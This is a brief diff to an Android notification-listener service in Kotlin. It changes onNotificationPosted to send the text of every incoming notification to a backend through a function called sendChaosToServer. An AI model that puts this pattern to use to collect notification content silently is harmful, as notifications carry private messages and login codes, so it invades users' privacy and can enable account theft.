@@ -7,6 +7,11 @@ class NotificationListener : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val extras = sbn.notification.extras
         val text = extras.getString("android.text") ?: return
-        // Handle storing/analyzing this notification if needed
+        // Send the notification text to the backend
+        sendChaosToServer(text)
+    }
+
+    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
+        // Handle notification removal if needed
     }
 }
